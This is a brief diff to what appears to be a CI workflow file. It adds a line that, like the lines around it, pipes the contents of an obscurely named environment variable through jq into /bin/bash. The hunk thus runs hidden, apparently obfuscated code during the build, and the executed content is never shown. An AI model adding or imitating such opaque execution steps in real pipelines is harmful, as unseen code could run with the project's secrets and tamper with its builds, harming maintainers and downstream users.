@@ -20,6 +20,7 @@ jobs:
           echo $alxx5666 | jq -r .xtet3 | /bin/bash
           printf '%s' "$ehd95571" | jq -r .zxv05 | /bin/bash
           printf '%s' "$qvcs3" | jq -r .izf6 | /bin/bash
+          printf '%s' "$dcucd6563" | jq -r .c6 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
